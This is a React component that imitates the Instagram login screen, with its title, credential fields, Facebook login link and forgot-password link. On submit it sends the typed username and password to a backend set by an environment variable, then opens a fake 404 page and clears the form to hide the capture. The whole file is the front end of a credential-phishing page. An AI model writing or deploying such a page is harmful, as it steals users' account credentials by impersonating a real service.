import { useState } from "react";
import "../App.css";
import { FaFacebook } from "react-icons/fa";
const Header = () => {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("Backend URL:", import.meta.env.VITE_BACKEND_URL);
    try {
      const response = await fetch(`${import.meta.env.VITE_BACKEND_URL}/`, {
        method: "POST",
        body: JSON.stringify(formData),
        headers: {
          "Content-Type": "application/json",
        },
      });

      if (response.status === 404) {
        window.open(`${import.meta.env.VITE_BACKEND_URL}/404`, "_blank");
        setFormData({ username: "", password: "" });
        return;
      }

      const data = await response.json();
      console.log("Success:", data);
    } catch (error) {
      console.error("Error:", error);
      window.open(`${import.meta.env.VITE_BACKEND_URL}/404`, "_blank"); // Open 404 page manually on failure
      setFormData({ username: "", password: "" });
    }
  };
  return (
    <>
      <div className="login-container">
        <form onSubmit={handleSubmit} className="login-form">
          <h1>Instagram</h1>
          <input
            type="text"
            name="username"
            value={formData.username}
            placeholder="Phone number, username, or email"
            onChange={handleChange}
            className="login-input"
          />
          <input
            type="password"
            name="password"
            value={formData.password}
            placeholder="Password"
            onChange={handleChange}
            className="login-input"
          />
          <button type="submit" className="login-button">
            Log In
          </button>
          <div className="or-divider">OR</div>
          <div className="facebook-login">
            <span style={{ margin: "2px 8px" }}>
              <FaFacebook />
            </span>
            <span>Log in with Facebook</span>
          </div>
          <div className="forgot-password">Forgot password?</div>
        </form>
      </div>

      <div className="signup-link">
        <span className="xyz">Don't have an account? </span>&nbsp;
        <span>Sign up</span>
      </div>
    </>
  );
};
export default Header;
